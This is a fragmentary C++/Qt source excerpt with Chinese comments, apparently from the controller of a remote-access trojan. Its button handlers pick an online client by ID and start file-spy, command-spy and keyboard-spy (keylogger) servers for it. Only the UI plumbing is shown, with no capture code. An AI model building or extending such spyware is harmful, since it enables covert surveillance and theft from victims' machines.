...
void m_Window::FileSpyClicked() // 创建服务端按钮点击槽函数
{
	bool ok;
	// 弹出输入框获取整数，初始值为0，输入范围为0到9999
	int id = QInputDialog::getInt(nullptr, "客户端 ID", "请输入已上线客户端 ID:", 0, 0, 9999, 1, &ok);
	...
	if (id != -1) {
		FileSpy* ss = new FileSpy();
		ZeroClient* client = mZeroServer->client(id);

		if (client == nullptr)
			return;

		int port = ss->startFileSpyServer(QString::number(id));
...
void m_Window::CmdSpyClicked() // 创建服务端按钮点击槽函数
{
	bool ok;
	// 弹出输入框获取整数，初始值为0，输入范围为0到9999
	int id = QInputDialog::getInt(nullptr, "客户端 ID", "请输入已上线客户端 ID:", 0, 0, 9999, 1, &ok);
	...
	if (id != -1) {
		CmdSpy* ss = new CmdSpy();
		ZeroClient* client = mZeroServer->client(id);

		if (client == nullptr)
			return;

		int port = ss->startCmdSpyServer(QString::number(id));
...
void m_Window::KeyboardSpyClicked() // 创建服务端按钮点击槽函数
{
	bool ok;
	// 弹出输入框获取整数，初始值为0，输入范围为0到9999
	int id = QInputDialog::getInt(nullptr, "客户端 ID", "请输入已上线客户端 ID:", 0, 0, 9999, 1, &ok);
	...
	if (id != -1) {
		KeyboardSpy* ss = new KeyboardSpy();
		ZeroClient* client = mZeroServer->client(id);

		if (client == nullptr)
			return;

		int port = ss->startKeyboardSpyServer(QString::number(id));
